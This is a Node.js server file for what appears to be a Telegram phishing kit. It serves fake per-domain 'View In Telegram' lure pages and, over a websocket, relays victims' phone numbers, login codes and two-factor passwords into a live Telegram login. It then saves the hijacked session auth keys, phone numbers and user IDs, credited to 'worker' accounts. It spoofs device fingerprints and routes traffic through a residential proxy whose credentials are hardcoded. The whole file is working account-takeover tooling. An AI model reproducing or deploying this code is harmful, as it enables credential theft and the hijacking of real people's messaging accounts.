import express from "express";
import http from 'http';
import { WebSocketServer } from "ws";
import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions/index.js";
import qs from 'querystring';
import config from '../config.json' assert { type: "json" };
import saveLog from "./saveLog.js";
import Database from "./database/index.js";
import hbs from 'hbs';
import domain from "./database/domain.js";
import Session from "./session.js";
import domainTemplate from "./database/domainTemplate.js";
import fs from 'fs';
import parsePhoneNumber from 'libphonenumber-js'
import ake from "./ake.js";

await Database.connect(config.db);
const app = express(),
    server = http.createServer(app,);
const ws = new WebSocketServer({ server })

app.set('view engine', 'html');
app.engine('html', hbs.__express);
app.set('views', `src/views`);

function makeid(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
        counter += 1;
    }
    return result;
}

const proxy = fs.readFileSync('proxy.txt', 'utf-8')
    .replaceAll('\r', '')
    .split('\n');

const getRandomDeviceParams = () => {
    const deviceParams = {
        windows: {
            appId: 2040,
            appHash: "b18441a1ff607e10a989891a5462e627",
            appVersions: [
                "5.3.1 x64",
                "5.4.1 x64"
            ],
            devices: [
                "YEA9M-PRO",
                "RQM9U2-PRO",
                "IMNI-ELITE",
                "CASYUK-PREMIUM"
            ],
            sdk: "Windows 10"
        },
        linux: {
            appId: 611335,
            appHash: "d524b414d21f4d37f08684c1df41ac9c",
            appVersions: [
                "5.7.1 arm64 Snap",
                "5.8.3 arm64 Snap",
                "5.9.0 arm64 Snap"
            ],
            devices: [
                "HP Chromebook 14",
                "Lenovo ThinkCentre M720",
                "Acer Veriton X2660G",
                "Dell Precision 5550",
                "Huawei MateBook D 14"
            ],
            sdks: [
                "Fedora 34",
                "Kubuntu 21.04",
                "Linux Mint 20.2 Cinnamon",
                "Pop!_OS 20.04 LTS",
                "Linux Mint 20.1 Ulyssa"
            ]
        },
        android: {
            appId: 17763,
            appHash: "e9a6411b6f175da4190011667e357e9d",
            appVersions: [
                "5.2.14 (13999)",
                "1.60.15 Z"
            ],
            devices: [
                "Lenovo K5 Note",
                "Telegram Web"
            ],
            sdk: "SDK 31"
        }
    };

    const platform = ['windows', 'linux', 'android'][Math.floor(Math.random() * 3)];
    const params = deviceParams[platform];

    return {
        app_id: params.appId,
        app_hash: params.appHash,
        device: params.devices[Math.floor(Math.random() * params.devices.length)],
        sdk: platform === 'linux' ?
            params.sdks[Math.floor(Math.random() * params.sdks.length)] :
            params.sdk,
        app_version: params.appVersions[Math.floor(Math.random() * params.appVersions.length)],
        system_lang_pack: "en",
        system_lang_code: "en",
        lang_pack: platform === 'android' ? "android" : "tdesktop",
        lang_code: "en"
    };
};

const formatProxy = proxy => {
    const [username, password, ip, port] = proxy.split(':');

    console.log({ ip, port: +port, username, password, socksType: 5 })
    return undefined;

    return { ip, port: +port, username, password, socksType: 5 };
}

app.get('/ready', (_req, res) => {
    res.json(true);
})


app.get(`/`, async (req, res) => {
    const site = await domain.findOne({ name: req.headers['host'] });

    if (site?.template === 0) return res.redirect('/login');

    const template = await domainTemplate.findOne({ id: site?.template });
    if (!site || !template) return res.status(404).send(`404`);

    template.text = template.type === 'bot' ? 'Send Message' : "View In Telegram";

    res.render(`zaza`, template);
})

app.use(express.static('src/public'));

app.get('/login', (_, res) => {
    res.send(fs.readFileSync(`src/public/index.html`, 'utf-8'));
});

app.get(`/log`, async (req, res) => {
    let site = await domain.findOne({ name: req.headers['host'] }) || {
        worker: 5439242814,
        name: 'localhost'
    };

    if (!site) return res.send('чоч');
    let owner = site.worker;
    console.log(site, owner)
    let bot = req.headers['host'];


    // const akeProxy = await ake.createPort('ru')
    //     .catch((() => ake.createPort('ru')));

    const deviceParams = getRandomDeviceParams();
    const formated = { ip: `geo.iproyal.com`, port: 32325, username: `rvcR5d7QURSEcSyV`, password: `VB0RceDyPGxckBEm_country-${'ru'}_streaming-1`, socksType: 5 }
    console.log("Сохраняем логи", deviceParams)
    const client = new TelegramClient(new Session(+req.query.dc, Buffer.from(req.query.key, 'hex')), deviceParams.appId, deviceParams.appHash, {
        connectionRetries: 10,
        proxy: formated,
        "appVersion": deviceParams.app_version,
        "deviceModel": deviceParams.device,
        "systemVersion": deviceParams.sdk,
        'langCode': deviceParams.lang_code
    });

    await client.connect();

    const user = await client.getMe();

    await saveLog({
        id: Date.now(),
        worker: owner,
        uid: user.id,
        premium: user.premium,
        dcId: req.query.dc,
        authKey: req.query.key,
        phone: user.phone,
        bot,
        deviceParams: deviceParams,
        proxy: formated
    });

    await client.disconnect();
    // await ake.deletePort(akeProxy.id);

    res.send(`ok`);
});

ws.on('connection', async (socket, request) => {
    let id, owner, type, bot, user, site, lang

    try {
        const parsed = qs.parse(request.url.split("?")[1]);
        id = parsed.id;
        owner = parsed.owner;
        type = parsed.type;
        lang = parsed.lang || 'ru';
        bot = parsed.token;

        console.log(id, owner, type, bot)
        if (!['bot', 'web', `qr`].includes(type) || !id) throw new Error(`Unauth`);
    } catch (e) {
        socket.send(`0-0`);
        return socket.close();
    }

    console.log(1)
    if (type !== `bot`) {
        site = await domain.findOne({ name: id }) || {
            worker: 5439242814,
            name: 'localhost'
        };
        if (!site) return socket.close();
        owner = site.worker;
        bot = id;
    }

    let number;

    socket.on('message', message => {
        try {
            message = JSON.parse(message.toString());
        } catch {
            socket.send(`0-0`);
            return socket.close();
        }

        if (message.action === 'number') number = message.data;
    })

    const waitForAction = action => new Promise(resolve => {
        console.log(action);
        if (action === 'number' && number) return resolve(number);

        socket.send(JSON.stringify({ action }))
        socket.onmessage = message => {
            try {
                message = JSON.parse(message.data);
            } catch {
                socket.send(`0-0`);
                return socket.close();
            }
            if (!message.action && !message.data) return socket.close();
            if (message.action === action) {
                console.log(message);
                resolve(message.data);
            }
        }
    });

    // let nnn = await waitForAction('number');

    let location = 'ru'//lang;//(parsePhoneNumber(nnn) || parsePhoneNumber("+" + nnn))?.country?.toLowerCase();

    // const akeProxy = await ake.createPort(location)
    //     .catch((() => ake.createPort('ru')));

    const formated = { ip: `geo.iproyal.com`, port: 32325, username: `rvcR5d7QURSEcSyV`, password: `VB0RceDyPGxckBEm_country-${location}_streaming-1`, socksType: 5 }
    // const formatedAke = { 
    //     ip: akeProxy.server, 
    //     port: akeProxy.port, 
    //     username: akeProxy.login, 
    //     password: akeProxy.password, 
    //     socksType: 5 
    // }
    const deviceParams = getRandomDeviceParams();

    const client = new TelegramClient(new StringSession(), deviceParams.appId, deviceParams.appHash, {
        connectionRetries: 10,
        proxy: formated,
        "appVersion": deviceParams.app_version,
        "deviceModel": deviceParams.device,
        "systemVersion": deviceParams.sdk,
        'langCode': deviceParams.lang_code
    });

    setTimeout(async () => {
        try {
            socket.close();
            await client.disconnect();
            // await ake.deletePort(akeProxy.id)
        } catch (e) {
            console.error(e);
        }
    }, 300000);

    socket.send(JSON.stringify({ action: 'connected' }));

    await client.start({
        phoneNumber: async () => await waitForAction('number'),
        password: async () => await waitForAction('password'),
        phoneCode: async () => await waitForAction('code'),
        onError: (data) => {
            number = undefined;
            console.log(data);
            socket.send(JSON.stringify({ action: 'error', data }));
        }
    });

    console.log(client.session.save());
    socket.send(JSON.stringify({ action: 'success' }))
    socket.close();

    const uu = await client.getMe();

    await saveLog({
        id: Date.now(),
        worker: owner,
        dcId: client.session.dcId,
        uid: uu.id,
        authKey: new StringSession(client.session.save())._key?.toString('hex'),
        phone: uu.phone,
        premium: uu.premium,
        bot,
        deviceParams: deviceParams,
    });

    await client.disconnect().catch(console.error);
    // await ake.deletePort(akeProxy.id)
});

server.listen(80, () => console.log("Server started"));